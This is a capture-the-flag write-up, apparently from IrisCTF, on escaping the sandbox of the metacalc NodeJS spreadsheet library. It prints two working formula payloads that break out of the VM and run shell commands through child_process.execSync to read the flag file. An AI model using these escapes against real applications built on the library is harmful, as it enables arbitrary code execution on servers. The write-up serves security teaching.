# metacalc (Web)
> I ran into this awesome NodeJS spreadsheet library using some custom sandboxing so I tried it out. I even hardened it a bit more. Nothing could ever go wrong

The challenge is a sandbox escape using the latest version of an obscure spreadsheet library, [metacalc](https://github.com/metarhia/metacalc). The library seems to be part of the [Metarhia](https://metarhia.com/) stack, and uses its own VM sanboxing library, [metavm](https://github.com/metarhia/metavm). The challenge isn't just on metavm because then it would really be too easy as copying a nodejs.vm sandbox escape from Google might work - the metacalc library has a bit more hardening applied.

As the description mentions, the library is further modified with this diff:
```diff
--- sheet.o.js	2022-08-11 17:32:27.803553441 -0700
+++ sheet.js	2022-08-11 17:38:51.821472938 -0700
@@ -7,13 +7,16 @@
   new Proxy(target, {
     get: (target, prop) => {
       if (prop === 'constructor') return null;
+      if (prop === '__proto__') return null;
       const value = target[prop];
       if (typeof value === 'number') return value;
       return wrap(value);
     },
   });
 
-const math = wrap(Math);
+// Math has too much of an attack surface :(
+const SlightlyLessUsefulMath = new Object();
+const math = wrap(SlightlyLessUsefulMath);
 
 const getValue = (target, prop) => {
   if (prop === 'Math') return math;
```

The app itself just runs the library and puts your input into a cell.
```js
const { Sheet } = require('metacalc');
const readline = require('readline');

const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
const sheet = new Sheet();

rl.question('I will add 1 to your input?? ', input => {
    sheet.cells["A1"] = 1;
    sheet.cells["A2"] = input;
    sheet.cells["A3"] = "=A1+A2";
    console.log(sheet.values["A3"]);
    process.exit(0);
});
```

I expected multiple solutions for this and people didn't dissapoint - I don't think anyone else used the same solution as me.

The intended solution takes advantage of this line in the proxy:
```js
       const value = target[prop];
```

This lookup is done _outside_ the vm, and triggering the lookup can actually result in a function call if the prop has a getter! We can use that to get outside the vm and then do a standard `execSync('cat /flag')`.
```js
=(function(){({}).constructor.defineProperty(Math, "a", {get: function() {const require = this.constructor.constructor('return process.mainModule.require')(); const flag = require('child_process').execSync('cat /flag').toString(); require('console').log(flag); return 1}})})()||Math.a
```
The `({}).constructor.` gets the `Object` class, and defineProperty is used to define a property `a` on Math that has a getter. The `||Math.a` triggets a call on the getter.

I also came up with this simpler escape, which is why the Math is replaced with a new Object. I forgot to null the prototype for that object, too, though :(
```js
=(function(){ const require = ({}).constructor.getPrototypeOf(Math.abs).constructor('return process.mainModule.require')(); const flag = require('child_process').execSync('cat /flag').toString(); require('console').log(flag); return 1})()
```

```
irisctf{be_careful_of_implicit_calls}
```
